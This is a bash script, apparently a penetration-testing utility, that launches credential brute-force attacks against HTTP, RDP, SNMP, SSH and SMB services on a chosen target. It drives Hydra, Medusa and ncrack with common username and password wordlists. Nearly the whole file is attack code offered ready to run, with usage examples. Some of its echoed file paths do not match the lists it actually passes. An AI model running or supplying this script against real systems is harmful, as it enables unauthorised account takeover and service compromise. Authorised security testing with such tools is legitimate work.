#!/bin/bash

RED='\033[1;31m'
BLUE='\033[1;34m'
GREEN='\033[1;32m'
YELLOW='\033[49;93m'
NC='\033[0m' # No Color

echo -e "${YELLOW}"
echo -e "+---_-----------------------------------------------+"
echo -e "|    Adversarial Informatics Combat Brute Forcer    |"
echo -e "|               cygienesolutions.com                |"
echo -e "|     [Usage]: ./atk_brute_aic.sh <TYPE> <TARGET>   |"
echo -e "+---------------------------------------------------+"
echo -e "${NC}"
if [ $# == 0 ] ; then
    echo -e "${GREEN}"
    echo -e "Description:"
    echo -e "Common brute force script for multiple protocols and services."
    echo -e "Select a brute type and specify a target."
    echo -e ""
    echo -e "Brute Types: http|rdp|snmp|ssh|smb|win"
    echo -e ""
    echo -e "[Usage]: ./atk_brute_aic.sh smb 192.168.1.44"
    echo -e "${NC}"
    exit 1; fi

TYPE="$1"
TARGET="$2"

# Hardcoded Full Path Directives.  Change to customize attack.
WINUSERFILE="/opt/SecLists/Passwords/common-win-users.txt"
USERFILE="/opt/SecLists/Usernames/top-usernames-shortlist.txt"
SSHPASSFILE="/opt/SecLists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt"
COMMONPASSFILE="/opt/SecLists/Passwords/Common-Credentials/top-passwords-shortlist.txt"
SNMPPASSFILE="/usr/share/wordlists/common-snmp-strings.txt"

if [ "$TYPE" == "http" ]; then
	echo -e "${GREEN}"
	echo -e "[+] Initiating HTTP brute force attack using Medusa"
	echo -e "[+] HTTP User Filepath: $USERFILE"
	echo -e "[+] HTTP User Filepath: $COMMONPASSFILE"
	echo -e "${NC}"
        echo -e "[!!] Functionality needs more work"
	if [ $# != 3 ] ; then
	    echo -e "${YELLOW}"
	    echo -e "HTTP Brute Force Requires a directory specification."
	    echo -e "[Example:] ./atk_brute_aic.sh http 192.168.1.44 /admin"
	    echo -e "${NC}"
	    exit 1; fi
	medusa -h $TARGET -U $USERFILE -P $COMMONPASSFILE -M http -m DIR:$3 -T 10

elif [ "$TYPE" == "rdp"  ]; then
        echo -e "${GREEN}"
        echo -e "[+] Initiating RDP (TCP/3389) brute force attack using Medusa"
        echo -e "[+] RDP User Filepath: $USERFILE"
        echo -e "[+] RDP Pass Filepath: $COMMONPASSFILE"
        echo -e "${NC}"
	ncrack -vv -U $WINUSERFILE -P $COMMONPASSFILE rdp://$TARGET

elif [ "$TYPE" == "snmp"  ]; then
        echo -e "${GREEN}"
        echo -e "[+] Initiating SNMP Community String brute force attack using Hydra"
        echo -e "[+] Community String Filepath: $SNMPPASSFILE"
        echo -e "${NC}"
	hydra -P $SNMPPASSFILE -v $TARGET snmp

elif [ "$TYPE" == "ssh"  ]; then
        echo -e "${GREEN}"
        echo -e "[+] Initiating SSH Brute Force using Hydra"
        echo -e "[+] SSH User Filepath: $USERFILE"
	echo -e "[+] SSH Pass Filepath: $SSHPASSFILE"
        echo -e "${NC}"
	hydra -v -V -t 4 -w 1 -L $USERFILE -P $SSHPASSFILE $TARGET ssh

elif [ "$TYPE" == "smb"  ]; then
        echo -e "${GREEN}"
        echo -e "[+] Initiating SMB Brute Force using Hydra"
        echo -e "[+] SMB User Filepath: $USERFILE"
        echo -e "[+] SMB Pass Filepath: $COMMONPASSFILE"
        echo -e "${NC}"
	hydra -v -V -t 4 -w 1 -L $WINUSERFILE -P $COMMONPASSFILE -t 1 $TARGET smb

elif [ "$TYPE" == "win"  ]; then
        echo -e "${GREEN}"
        echo -e "[+] Initiating Windows Brute Force using Hydra"
        echo -e "[+] Windows Credential File: $WINUSERFILE"
        echo -e "${NC}"
        hydra -v -V -t 4 -L $WINUSERFILE -P $COMMONPASSFILE -t 1 $TARGET smb

else
        echo "Please provide a useful brute force type."
	echo "Current Brute Force Types: http|rdp|snmp|ssh|smb|win"

fi

